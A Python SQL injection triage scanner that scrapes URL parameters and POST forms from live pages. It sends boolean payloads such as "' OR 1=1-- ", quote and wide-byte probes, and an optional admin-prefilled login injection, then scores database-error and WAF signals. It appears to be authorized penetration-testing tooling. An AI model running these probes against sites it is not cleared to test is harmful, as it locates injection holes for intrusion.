#!/usr/bin/env python3
"""Low-impact SQL injection triage for authorized run directories.

The script consumes parameterized URLs already discovered by the controlled
workflow, performs a tiny differential probe set with curl, and writes evidence
metadata only. It does not enumerate databases, dump data, use time delays, or
submit write-oriented requests.
"""

from __future__ import annotations

import argparse
import csv
import json
import re
import time
from collections import defaultdict
from dataclasses import dataclass
from difflib import SequenceMatcher
from pathlib import Path
from urllib.parse import parse_qsl, quote_plus, urlencode, urlparse, urlunparse

from api_discovery import FetchResult, append_jsonl, fetch, now_iso


DB_ERROR_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("mysql", re.compile(r"(you have an error in your sql syntax|warning.*mysql|mysql_fetch|mysqli_|mysqlsyntaxerrorexception)", re.I)),
    ("postgresql", re.compile(r"(postgresql.*error|psycopg|syntax error at or near|pg_query\(|pg_exec\()", re.I)),
    ("mssql", re.compile(r"(unclosed quotation mark|sql server|system\.data\.sqlclient|microsoft ole db provider for sql server|sqlserverexception)", re.I)),
    ("oracle", re.compile(r"(ora-\d{5}|oracle error|oracle.*driver|quoted string not properly terminated)", re.I)),
    ("sqlite", re.compile(r"(sqlite error|sqlite3\.operationalerror|sqliteexception|near \".*\": syntax error)", re.I)),
    ("java_sql", re.compile(r"(java\.sql\.sqlexception|sqlgrammar|bad sql grammar|jdbc exception|hibernate.*sql)", re.I)),
    ("generic", re.compile(r"(sql syntax|sqlstate|database error|db error|pdoexception|odbc.*driver)", re.I)),
]

RISKY_PATH_RE = re.compile(
    r"(/|\b)(upload|import|export|download|delete|remove|drop|update|modify|edit|save|create|add|submit|"
    r"pay|payment|refund|send|mail|sms|reset|password|passwd|logout|file|attachment)(/|\b|[A-Z_-])",
    re.I,
)
STATIC_EXT_RE = re.compile(r"\.(?:png|jpe?g|gif|svg|ico|css|woff2?|ttf|map|mp4|pdf|docx?|xlsx?|zip|rar)(?:[?#].*)?$", re.I)
LOW_VALUE_PARAM_RE = re.compile(r"^(callback|jsonp|_t|timestamp|ts|time|nonce|sign|signature|token|access_token|csrf|_csrf)$", re.I)
PARAM_PRIORITY_RE = re.compile(r"(id|uid|user|org|dept|code|type|category|cat|kw|key|keyword|search|query|q|name|title|page|size|limit|year)", re.I)
WAF_OR_BLOCK_RE = re.compile(
    r"(waf|web application firewall|blocked|forbidden|access denied|request rejected|ray id|cloudflare|akamai|"
    r"incapsula|imperva|安全狗|云锁|防火墙|攻击拦截|访问拦截|非法请求|风控|验证码|captcha|人机验证)",
    re.I,
)
GENERIC_ERROR_PAGE_RE = re.compile(
    r"(service unavailable|temporarily unavailable|system busy|runtime error|internal server error|"
    r"服务器错误|系统繁忙|访问出错|页面出错|发生错误|请稍后再试)",
    re.I,
)


@dataclass(frozen=True)
class UrlParam:
    url: str
    param: str
    base_url: str = ""
    source: str = ""
    priority_score: int = 0
    method: str = "GET"
    body: str = ""


def read_jsonl(path: Path) -> list[dict]:
    rows: list[dict] = []
    if not path.exists():
        return rows
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        if not line.strip():
            continue
        try:
            rows.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return rows


def endpoint_key(url: str, param: str) -> str:
    return f"{url.rstrip()}#{param}"


def is_probably_safe_get_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc or not parsed.query:
        return False
    if STATIC_EXT_RE.search(parsed.path or ""):
        return False
    if RISKY_PATH_RE.search(parsed.path or ""):
        return False
    return True


def choose_params(url: str, max_params: int) -> list[str]:
    params = parse_qsl(urlparse(url).query, keep_blank_values=True)
    names: list[str] = []
    for name, value in params:
        if not name or LOW_VALUE_PARAM_RE.search(name):
            continue
        if len(value) > 120:
            continue
        names.append(name)
    names = sorted(set(names), key=lambda name: (0 if PARAM_PRIORITY_RE.search(name) else 1, name.lower()))
    return names[:max_params]


def _urlquote(value: str) -> str:
    try:
        return quote_plus(value.encode("latin-1"))
    except UnicodeEncodeError:
        return quote_plus(value.encode("utf-8"))


def _urlencode(pairs: list[tuple[str, str]]) -> str:
    return "&".join(f"{_urlquote(name)}={_urlquote(value)}" for name, value in pairs)


def build_request(url_param: UrlParam, value: str) -> tuple[str, str, str]:
    """返回 (url, method, body)；body 为空表示无请求体。"""
    if url_param.method == "POST":
        pairs = parse_qsl(url_param.body, keep_blank_values=True)
        replaced = [(name, value if name == url_param.param else old_value) for name, old_value in pairs]
        return url_param.url, "POST", _urlencode(replaced)
    parsed = urlparse(url_param.url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = [(name, value if name == url_param.param else old_value) for name, old_value in pairs]
    return urlunparse(parsed._replace(query=_urlencode(replaced))), "GET", ""


def mutate_param(url_param: UrlParam, value: str) -> str:
    return build_request(url_param, value)[0]


def param_value(url_param: UrlParam) -> str:
    raw = url_param.body if url_param.method == "POST" else urlparse(url_param.url).query
    for name, value in parse_qsl(raw, keep_blank_values=True):
        if name == url_param.param:
            return value
    return ""


def boolean_payloads(value: str) -> tuple[list[str], list[str]]:
    """返回 (true_payloads, false_payloads)，覆盖：
    数字值：AND 逻辑（数字型）+ 引号闭合注释（数字值字符串型）。
    字符串值：单/双引号 × 有无括号共 4 族 OR 注释版（不依赖字段原始值）。
    注释用 '-- '（避免 # 被过滤），全部只读，无延时、无写入。
    """
    if re.fullmatch(r"-?\d+(?:\.\d+)?", value.strip()):
        base = value.strip()
        if re.fullmatch(r"-?\d+", base):
            return (
                [f"{base} AND 1=1", f"{base}' AND '1'='1'-- ", f"{base}.0"],
                [f"{base} AND 1=2", f"{base}' AND '1'='2'-- ", f"{base}.9"],
            )
        return (
            [f"{base} AND 1=1", f"{base}' AND '1'='1'-- "],
            [f"{base} AND 1=2", f"{base}' AND '1'='2'-- "],
        )
    return (
        ["' OR 1=1-- ", "') OR 1=1-- ", '" OR 1=1-- ', '") OR 1=1-- '],
        ["' OR 1=2-- ", "') OR 1=2-- ", '" OR 1=2-- ', '") OR 1=2-- '],
    )


def normalize_body(text: str) -> str:
    text = text[:120000]
    text = re.sub(r"\b\d{10,}\b", "<num>", text)
    text = re.sub(r"\s+", " ", text)
    return text.strip()


def similarity(left: str, right: str) -> float:
    if not left and not right:
        return 1.0
    return SequenceMatcher(None, normalize_body(left), normalize_body(right)).ratio()


def length_delta_ratio(left: str, right: str) -> float:
    baseline = max(len(left), 1)
    return abs(len(left) - len(right)) / baseline


def db_error_family(text: str) -> str:
    for family, pattern in DB_ERROR_PATTERNS:
        if pattern.search(text or ""):
            return family
    return ""


def environment_notes(*texts: str) -> list[str]:
    combined = "\n".join((text or "")[:60000] for text in texts)
    notes: list[str] = []
    if WAF_OR_BLOCK_RE.search(combined):
        notes.append("waf_or_block_page_hint")
    if GENERIC_ERROR_PAGE_RE.search(combined):
        notes.append("generic_error_page_hint")
    return notes


def confidence_tier(score: int) -> str:
    if score >= 85:
        return "P0"
    if score >= 70:
        return "P1"
    if score >= 50:
        return "P2"
    return "P3"


def score_probe(confidence: str, high_probability: bool, signals: list[str], baseline_stable: bool, notes: list[str]) -> int:
    if high_probability:
        score = 88
    elif confidence == "medium":
        score = 62
    elif confidence == "low":
        score = 45
    else:
        score = 18
    if "boolean_differential" in signals:
        score += 6
    if any(str(signal).startswith("db_error_signature") for signal in signals):
        score += 8
    if any("5xx" in str(signal) for signal in signals) and baseline_stable:
        score += 5
    if not baseline_stable:
        score -= 12
    if "waf_or_block_page_hint" in notes:
        score -= 12
    if "generic_error_page_hint" in notes and not any(str(signal).startswith("db_error_signature") for signal in signals):
        score -= 8
    return max(0, min(100, score))


def sample_meta(result: FetchResult | None) -> dict:
    if result is None:
        return {"status": None, "final_url": None, "content_type": None,
                "content_length": None, "sample_sha256": None,
                "elapsed_seconds": None, "error": "skipped_quote_only"}
    return {
        "status": result.status,
        "final_url": result.final_url,
        "content_type": result.content_type,
        "content_length": result.content_length,
        "sample_sha256": result.sample_sha256,
        "elapsed_seconds": round(result.elapsed_seconds, 3),
        "error": result.error,
    }


def fetch_wait(url: str, method: str, body: str, run_dir: Path, timeout: int, delay: float,
               extra_headers: dict | None = None) -> FetchResult:
    if method == "POST":
        import hashlib
        import requests as req_lib
        from api_discovery import sha256 as sha256_of
        try:
            headers = {"User-Agent": "Mozilla/5.0 exercise-recon/1.0",
                       "Content-Type": "application/x-www-form-urlencoded"}
            headers.update(extra_headers or {})
            resp = req_lib.post(
                url,
                data=body,
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            result = FetchResult(
                url=url,
                status=int(resp.status_code),
                final_url=resp.url,
                content_type=str(resp.headers.get("content-type") or ""),
                content_length=str(len(resp.content)),
                elapsed_seconds=float(resp.elapsed.total_seconds()),
                sample_sha256=sha256_of(resp.content[:65536]),
                text=resp.text or "",
                tool_used="requests",
            )
        except Exception as exc:  # noqa: BLE001
            result = FetchResult(url=url, status=0, error=str(exc)[:200], tool_used="requests")
    else:
        result = fetch(url, timeout, min(4, timeout), run_dir / ".sqli_tmp", extra_headers=extra_headers)
    if delay > 0:
        time.sleep(delay)
    return result


USER_FIELD_RE = re.compile(r"(user|uname|login|account|name)", re.I)
PASS_FIELD_RE = re.compile(r"(pass|pwd|secret)", re.I)


def prefill_assisted_probe(url_param: UrlParam, timeout: int, delay: float,
                           run_dir: Path, extra_headers: dict | None = None) -> tuple[FetchResult | None, FetchResult | None]:
    """表单联动探测：当探测参数是密码类而表单还有用户类字段时，用常见用户名
    admin 填充用户字段再注入探测参数（覆盖 UPDATE/前置校验类注入点，如
    WHERE username='$uname' 匹配成功后才执行 UPDATE 的关卡）。"""
    if url_param.method != "POST" or not url_param.body:
        return None, None
    if not PASS_FIELD_RE.search(url_param.param):
        return None, None
    pairs = parse_qsl(url_param.body, keep_blank_values=True)
    others = [name for name, _ in pairs if name != url_param.param]
    user_field = next((name for name in others
                       if USER_FIELD_RE.search(name) and not PASS_FIELD_RE.search(name)), None)
    if not user_field:
        return None, None

    def with_vals(extra: dict) -> str:
        replaced = [(name, extra.get(name, old_value)) for name, old_value in pairs]
        return _urlencode(replaced)

    base_body = with_vals({user_field: "admin"})
    probe_body = with_vals({user_field: "admin", url_param.param: param_value(url_param) + "'"})
    base = fetch_wait(url_param.url, "POST", base_body, run_dir, timeout, delay, extra_headers)
    probe = fetch_wait(url_param.url, "POST", probe_body, run_dir, timeout, delay, extra_headers)
    return base, probe


def analyze_probe(url_param: UrlParam, run_dir: Path, timeout: int, delay: float,
                  quote_only: bool = False, enable_prefill: bool = False,
                  extra_headers: dict | None = None) -> dict:
    original_value = param_value(url_param)
    qs_url, qs_method, qs_body = build_request(url_param, original_value + "'")
    qd_url, qd_method, qd_body = build_request(url_param, original_value + '"')
    qw_url, qw_method, qw_body = build_request(url_param, original_value + "\xbf'")
    qw2_url, qw2_method, qw2_body = build_request(url_param, original_value + '\xbf"')
    bool_true_payloads, bool_false_payloads = boolean_payloads(original_value)
    bool_len = len(bool_true_payloads)

    base1 = fetch_wait(url_param.url, url_param.method, url_param.body, run_dir, timeout, delay, extra_headers)
    base2 = fetch_wait(url_param.url, url_param.method, url_param.body, run_dir, timeout, delay, extra_headers)
    quote_s = fetch_wait(qs_url, qs_method, qs_body, run_dir, timeout, delay, extra_headers)
    quote_d = fetch_wait(qd_url, qd_method, qd_body, run_dir, timeout, delay, extra_headers)
    quote_w = None
    quote_w2 = None
    if not quote_only:
        quote_w = fetch_wait(qw_url, qw_method, qw_body, run_dir, timeout, delay, extra_headers)
        quote_w2 = fetch_wait(qw2_url, qw2_method, qw2_body, run_dir, timeout, delay, extra_headers)

    bool_labels = ("s", "s_paren", "d", "d_paren")[:bool_len]
    bool_probes: list[tuple[str, FetchResult, FetchResult]] = []
    if not quote_only:
        for label, bt, bf in zip(bool_labels, bool_true_payloads, bool_false_payloads):
            t_url, t_method, t_body = build_request(url_param, bt)
            f_url, f_method, f_body = build_request(url_param, bf)
            bool_probes.append((label,
                                fetch_wait(t_url, t_method, t_body, run_dir, timeout, delay, extra_headers),
                                fetch_wait(f_url, f_method, f_body, run_dir, timeout, delay, extra_headers)))

    base_stability = similarity(base1.text, base2.text)
    quote_similarity = similarity(base1.text, quote_s.text)
    quote_d_similarity = similarity(base1.text, quote_d.text)
    quote_w_similarity = 1.0 if quote_w is None else similarity(base1.text, quote_w.text)
    quote_w2_similarity = 1.0 if quote_w2 is None else similarity(base1.text, quote_w2.text)

    baseline_error = db_error_family(base1.text + "\n" + base2.text)
    quote_s_error = db_error_family(quote_s.text)
    quote_d_error = db_error_family(quote_d.text)
    quote_w_error = db_error_family(quote_w.text) if quote_w is not None else ""
    quote_w2_error = db_error_family(quote_w2.text) if quote_w2 is not None else ""

    bool_diffs: dict[str, dict] = {}
    for label, btrue, bfalse in bool_probes:
        true_sim = similarity(base1.text, btrue.text)
        false_sim = similarity(base1.text, bfalse.text)
        tf_sim = similarity(btrue.text, bfalse.text)
        bool_diffs[label] = {
            "true_sim": true_sim, "false_sim": false_sim, "tf_sim": tf_sim,
            "true_status": btrue.status, "false_status": bfalse.status,
            "true_error": db_error_family(btrue.text), "false_error": db_error_family(bfalse.text),
            "true_text": btrue.text, "false_text": bfalse.text,
        }

    signals: list[str] = []
    confidence = "none"
    high_probability = False

    baseline_stable = base1.status == base2.status and base_stability >= 0.90 and length_delta_ratio(base1.text, base2.text) <= 0.25
    if not baseline_stable:
        signals.append("unstable_baseline")
    for label, probe in (("quote_single", quote_s), ("quote_double", quote_d), ("quote_widebyte_s", quote_w),
                         ("quote_widebyte_d", quote_w2)):
        if probe.status >= 500 and base1.status < 500:
            signals.append(f"{label}_status_5xx_delta")
            confidence = "medium"
    for label, err in (("quote_single", quote_s_error), ("quote_double", quote_d_error),
                       ("quote_widebyte_s", quote_w_error), ("quote_widebyte_d", quote_w2_error)):
        if err and err != baseline_error:
            signals.append(f"db_error_signature:{err}:{label}")
            confidence = "high"
            high_probability = True
    if baseline_stable and quote_w_error == baseline_error and quote_w_similarity <= 0.94 \
            and quote_similarity >= 0.94 and quote_d_similarity >= 0.94:
        signals.append("widebyte_differential_weak")
        if confidence in ("none", "low"):
            confidence = "medium"

    import re as _re
    for label, info in bool_diffs.items():
        if info["false_status"] >= 500 and base1.status < 500:
            signals.append(f"boolean_false_{label}_status_5xx_delta")
            confidence = "medium"
        if info["false_error"] and info["false_error"] != baseline_error:
            signals.append(f"db_error_signature:{info['false_error']}:bool_{label}")
            confidence = "high"
            high_probability = True
        if (
            baseline_stable
            and info["true_status"] == base1.status
            and info["true_sim"] >= 0.90
            and info["false_sim"] <= 0.75
            and info["tf_sim"] <= 0.85
        ):
            signals.append(f"boolean_differential:{label}")
            confidence = "high"
            high_probability = True
        if (
            baseline_stable
            and info["true_status"] == base1.status
            and info["true_sim"] <= 0.75
            and info["false_sim"] >= 0.90
            and info["tf_sim"] <= 0.85
        ):
            signals.append(f"boolean_differential_reverse:{label}")
            confidence = "high"
            high_probability = True
        if (
            baseline_stable
            and info["true_status"] == base1.status
            and info["true_sim"] >= 0.97
            and info["false_sim"] <= 0.95
            and info["tf_sim"] <= 0.97
        ):
            signals.append(f"boolean_differential_weak:{label}")
            if confidence in ("none", "low"):
                confidence = "medium"
        if _re.search(r"<img[^>]*>", info["true_text"]) and _re.search(r"<img[^>]*>", info["false_text"]):
            img_true = set(_re.findall(r"<img[^>]*>", info["true_text"]))
            img_false = set(_re.findall(r"<img[^>]*>", info["false_text"]))
            if img_true != img_false:
                signals.append(f"markup_token_delta:img:{label}")
                confidence = "medium"
    if not signals and (quote_similarity <= 0.70 or quote_d_similarity <= 0.70) and baseline_stable:
        signals.append("quote_response_delta")
        confidence = "low"

    prefill_similarity: float | None = None
    prefill_base = None
    prefill_probe = None
    if not quote_only and enable_prefill:
        prefill_base, prefill_probe = prefill_assisted_probe(url_param, timeout, delay, run_dir, extra_headers)
    if prefill_base is not None and prefill_probe is not None:
        prefill_similarity = similarity(prefill_base.text, prefill_probe.text)
        if prefill_base.status == prefill_probe.status and prefill_probe.status < 500 \
                and prefill_similarity <= 0.95 and prefill_base.text:
            signals.append("prefill_assisted_differential")
            if confidence in ("none", "low"):
                confidence = "medium"

    bool_texts: list[str] = []
    for _label, t_probe, f_probe in bool_probes:
        bool_texts.append(t_probe.text)
        bool_texts.append(f_probe.text)
    env_notes = environment_notes(base1.text, base2.text, quote_s.text, quote_d.text, *bool_texts)
    candidate_score = score_probe(confidence, high_probability, signals, baseline_stable, env_notes)

    return {
        "checked_at": now_iso(),
        "url": url_param.url,
        "param": url_param.param,
        "host": urlparse(url_param.url).netloc,
        "base_url": url_param.base_url,
        "source": url_param.source,
        "source_priority_score": url_param.priority_score,
        "signals": signals,
        "confidence": confidence,
        "high_probability": high_probability,
        "candidate_score": candidate_score,
        "candidate_priority": confidence_tier(candidate_score),
        "environment_notes": env_notes,
        "retest_recommended": candidate_score >= 50,
        "notes": "500/status changes are triage signals only; high probability requires DB error signatures or stable boolean differential. WAF/generic-error hints lower priority but do not discard the lead.",
        "baseline_stability": round(base_stability, 3),
        "quote_similarity": round(quote_similarity, 3),
        "boolean_diffs": {label: {k: round(v, 3) if isinstance(v, float) else v for k, v in info.items()}
                          for label, info in bool_diffs.items()},
        "baseline": sample_meta(base1),
        "baseline_repeat": sample_meta(base2),
        "quote_probe": sample_meta(quote_s),
        "quote_double_probe": sample_meta(quote_d),
        "quote_widebyte_probe": sample_meta(quote_w),
        "quote_widebyte_double_probe": sample_meta(quote_w2),
        "boolean_probes": [{"label": label, "true": sample_meta(t), "false": sample_meta(f)}
                           for label, t, f in bool_probes],
        "quote_only": quote_only,
        "prefill_assisted_similarity": round(prefill_similarity, 3) if prefill_similarity is not None else None,
        "method": url_param.method,
        "body": url_param.body if url_param.method == "POST" else "",
    }


def load_url_params(run_dir: Path, max_params_per_url: int, max_per_host: int, limit: int, force: bool) -> list[UrlParam]:
    rows: list[dict] = []
    for name in ("api_candidates.jsonl", "api_confirmed.jsonl", "api_interesting.jsonl"):
        for row in read_jsonl(run_dir / name):
            if row.get("url"):
                rows.append({**row, "_source_file": name})
    katana_path = run_dir / "katana_urls.txt"
    if katana_path.exists():
        for line in katana_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            value = line.strip()
            if value:
                rows.append({"url": value, "_source_file": "katana_urls.txt"})
    targets_csv = run_dir / "targets.csv"
    if targets_csv.exists():
        with targets_csv.open("r", encoding="utf-8", errors="ignore", newline="") as handle:
            for row in csv.DictReader(handle):
                if row.get("url"):
                    rows.append({"url": row["url"], "_source_file": "targets.csv"})

    completed: set[str] = set()
    if not force:
        completed = {endpoint_key(str(row.get("url") or ""), str(row.get("param") or "")) for row in read_jsonl(run_dir / "sqli_triage_results.jsonl")}

    accepted: list[UrlParam] = []
    seen: set[str] = set()
    per_host: dict[str, int] = defaultdict(int)
    rows = sorted(rows, key=lambda row: int(row.get("priority_score") or row.get("source_priority_score") or 0), reverse=True)
    for row in rows:
        url = str(row.get("url") or "").strip()
        if not is_probably_safe_get_url(url):
            continue
        parsed = urlparse(url)
        if per_host[parsed.netloc] >= max_per_host:
            continue
        for param in choose_params(url, max_params_per_url):
            key = endpoint_key(url, param)
            if key in seen or key in completed:
                continue
            seen.add(key)
            accepted.append(UrlParam(
                url=url,
                param=param,
                base_url=str(row.get("base_url") or ""),
                source=str(row.get("_source_file") or row.get("family") or ""),
                priority_score=int(row.get("priority_score") or row.get("source_priority_score") or 0),
            ))
            per_host[parsed.netloc] += 1
            if limit and len(accepted) >= limit:
                return accepted
            if per_host[parsed.netloc] >= max_per_host:
                break
    return accepted


POST_FIELD_PRIORITY_RE = re.compile(r"(user|uname|username|passwd|password|pwd|login|email|mobile|phone|code|id)", re.I)
FORM_RE = re.compile(r"<form\b[^>]*>", re.I)
INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)
TEXTAREA_RE = re.compile(r"<textarea\b[^>]*>", re.I)
SELECT_RE = re.compile(r"<select\b[^>]*>", re.I)


def form_method(tag: str) -> str:
    m = re.search(r'method\s*=\s*["\']?\s*([a-z]+)', tag, re.I)
    return (m.group(1) or "get").lower()


def form_action(tag: str, base_url: str) -> str:
    m = re.search(r'action\s*=\s*["\']([^"\']*)["\']', tag, re.I)
    if not m:
        return base_url
    action = m.group(1).strip()
    if not action:
        return base_url
    from urllib.parse import urljoin
    return urljoin(base_url, action)


def input_name(tag: str) -> str:
    m = re.search(r'name\s*=\s*["\']?([^"\'>\s]+)', tag, re.I)
    return m.group(1) if m else ""


def discover_post_params(
    run_dir: Path,
    max_fields_per_url: int,
    max_per_host: int,
    limit: int,
    force: bool,
    timeout: int,
    delay: float,
) -> list[UrlParam]:
    import requests as req_lib

    rows: list[dict] = []
    for name in ("api_candidates.jsonl", "api_confirmed.jsonl", "api_interesting.jsonl", "probe_results.jsonl"):
        for row in read_jsonl(run_dir / name):
            if row.get("url") or row.get("final_url"):
                rows.append({"url": str(row.get("url") or row.get("final_url") or ""), "_source_file": name})
    katana_path = run_dir / "katana_urls.txt"
    if katana_path.exists():
        for line in katana_path.read_text(encoding="utf-8", errors="ignore").splitlines():
            value = line.strip()
            if value:
                rows.append({"url": value, "_source_file": "katana_urls.txt"})
    targets_csv = run_dir / "targets.csv"
    if targets_csv.exists():
        with targets_csv.open("r", encoding="utf-8", errors="ignore", newline="") as handle:
            for row in csv.DictReader(handle):
                if row.get("url"):
                    rows.append({"url": row["url"], "_source_file": "targets.csv"})

    completed: set[str] = set()
    if not force:
        completed = {
            f"{str(row.get('url') or '')}#{str(row.get('param') or '')}@POST"
            for row in read_jsonl(run_dir / "sqli_triage_results.jsonl") if row.get("method") == "POST"
        }

    accepted: list[UrlParam] = []
    seen: set[str] = set()
    per_host: dict[str, int] = defaultdict(int)
    for row in rows:
        url = str(row.get("url") or "").strip()
        if not is_http_url_like(url):
            continue
        if STATIC_EXT_RE.search(urlparse(url).path or ""):
            continue
        host = (urlparse(url).netloc or "").lower()
        if not host or per_host[host] >= max_per_host:
            continue
        page_url = url
        try:
            resp = req_lib.get(page_url, headers={"User-Agent": "Mozilla/5.0 exercise-recon/1.0"},
                               timeout=timeout, verify=False, allow_redirects=True)
        except Exception:  # noqa: BLE001
            continue
        if resp.status_code >= 400 or not resp.text:
            continue
        text = resp.text
        for form_tag in FORM_RE.findall(text):
            if form_method(form_tag) != "post":
                continue
            form_start = text.find(form_tag)
            form_end_match = re.search(r"</form>", text[form_start + len(form_tag):], re.I)
            form_end = form_start + len(form_tag) + (form_end_match.start() if form_end_match else 0)
            form_body = text[form_start:form_end]
            fields: list[str] = []
            for field_tag in INPUT_RE.findall(form_body) + TEXTAREA_RE.findall(form_body) + SELECT_RE.findall(form_body):
                name = input_name(field_tag)
                if name and name not in fields:
                    fields.append(name)
            fields = sorted(fields, key=lambda name: (0 if POST_FIELD_PRIORITY_RE.search(name) else 1, name.lower()))
            fields = fields[:max_fields_per_url]
            if not fields:
                continue
            action_url = form_action(form_tag, page_url)
            for field in fields:
                key = f"{action_url}#{field}@POST"
                if key in seen or key in completed:
                    continue
                seen.add(key)
                body = urlencode([(name, "") for name in fields])
                accepted.append(UrlParam(
                    url=action_url,
                    param=field,
                    base_url=action_url,
                    source=f"post_form:{row.get('_source_file', '')}",
                    method="POST",
                    body=body,
                ))
                per_host[host] += 1
                if limit and len(accepted) >= limit:
                    return accepted
                if per_host[host] >= max_per_host:
                    break
            if per_host[host] >= max_per_host:
                break
        if delay > 0:
            time.sleep(delay)
    return accepted


def is_http_url_like(url: str) -> bool:
    return url.startswith("http://") or url.startswith("https://")


def refresh_text_outputs(run_dir: Path) -> None:
    high_rows = read_jsonl(run_dir / "sqli_high_probability.jsonl")
    anomaly_rows = [
        row for row in read_jsonl(run_dir / "sqli_candidates.jsonl")
        if any("5xx" in signal or "db_error_signature" in signal for signal in row.get("signals", []))
    ]
    high_lines = sorted({row.get("url", "") for row in high_rows if row.get("url")})
    anomaly_lines = sorted({row.get("url", "") for row in anomaly_rows if row.get("url")})
    (run_dir / "sqli_high_probability.txt").write_text("\n".join(high_lines) + ("\n" if high_lines else ""), encoding="utf-8")
    (run_dir / "sqli_500_or_error_anomalies.txt").write_text("\n".join(anomaly_lines) + ("\n" if anomaly_lines else ""), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description="Low-impact SQL injection triage for discovered parameterized URLs")
    parser.add_argument("--run-dir", type=Path, required=True)
    parser.add_argument("--delay", type=float, default=3.0)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--max-per-host", type=int, default=3)
    parser.add_argument("--max-params-per-url", type=int, default=2)
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--force", action="store_true")
    parser.add_argument("--quote-only", action="store_true",
                        help="Skip boolean-differential probes; only base+quote requests (always safe for attempt-limited pages)")
    parser.add_argument("--enable-prefill", action="store_true",
                        help="Enable admin-prefilled user-field probe for password fields (sends login-style POST requests; off by default to avoid account-lockout/rate-limit risk on real targets)")
    args = parser.parse_args()

    url_params = load_url_params(args.run_dir, args.max_params_per_url, args.max_per_host, args.limit, args.force)
    url_params.extend(discover_post_params(
        args.run_dir, args.max_params_per_url, args.max_per_host, args.limit, args.force, args.timeout, args.delay,
    ))
    manifest = {
        "created_at": now_iso(),
        "candidate_param_count": len(url_params),
        "delay": args.delay,
        "timeout": args.timeout,
        "max_per_host": args.max_per_host,
        "max_params_per_url": args.max_params_per_url,
        "request_budget_per_param": 4 if args.quote_only else 16,
        "quote_only": args.quote_only,
        "enable_prefill": args.enable_prefill,
        "disabled_tests": ["time_based", "union_select", "stacked_queries", "database_dump", "write_payloads"],
    }
    (args.run_dir / "sqli_triage_manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")

    for url_param in url_params:
        try:
            record = analyze_probe(url_param, args.run_dir, args.timeout, args.delay,
                                   quote_only=args.quote_only, enable_prefill=args.enable_prefill)
        except Exception as exc:  # noqa: BLE001
            record = {
                "checked_at": now_iso(),
                "url": url_param.url,
                "param": url_param.param,
                "host": urlparse(url_param.url).netloc,
                "signals": ["probe_error"],
                "confidence": "none",
                "high_probability": False,
                "error": str(exc)[:300],
            }
        append_jsonl(args.run_dir / "sqli_triage_results.jsonl", record)
        if record.get("signals") and record.get("signals") != ["unstable_baseline"]:
            append_jsonl(args.run_dir / "sqli_candidates.jsonl", record)
        if record.get("high_probability"):
            append_jsonl(args.run_dir / "sqli_high_probability.jsonl", record)
        refresh_text_outputs(args.run_dir)

    refresh_text_outputs(args.run_dir)
    print(json.dumps({"tested": len(url_params), "run_dir": str(args.run_dir)}, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
